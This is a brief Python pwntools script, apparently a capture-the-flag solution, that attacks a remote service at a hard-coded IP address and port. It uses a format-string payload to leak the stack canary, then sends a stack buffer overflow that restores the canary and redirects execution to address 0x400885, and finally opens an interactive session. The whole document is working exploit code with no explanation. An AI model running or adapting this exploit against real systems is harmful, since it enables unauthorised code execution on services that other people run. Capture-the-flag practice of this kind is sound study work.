from pwn import *

io = remote("109.233.56.90", 11589)
io.sendlineafter(b"name:", b"%23$p")
io.recvuntil(b"Welcome, ")
canary = int(io.recvuntil(b"!").rstrip(b"!"), 16)
log.info("canary: %#x", canary)
io.sendlineafter(b"message:", b"A"*136 + p64(canary) + b"B"*8 + p64(0x400885))
io.interactive()
